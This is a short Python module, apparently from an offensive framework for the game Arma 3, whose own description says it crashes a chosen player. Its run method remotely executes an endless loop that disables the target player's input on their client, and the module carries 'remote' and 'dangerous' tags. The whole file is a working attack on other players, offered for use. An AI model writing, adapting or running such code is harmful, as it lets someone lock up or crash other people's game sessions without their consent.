from core.module import *
from core.option import *
import core.engines.arma3 as engine



class Module(BaseModule):
	__info__ = {
		"name": "crash",
		"description": "crashes the selected player",
		"authors": ("aw3"),
		"tags": ("arma,remote,dangerous"),
	}

	target_player = OptString("", "Target player name")

	def check(self):
		return self.target_player in engine.get_players()

	def run(self):
		engine.execute_remote_player('while {true} do { disableUserInput true;};', self.target_player)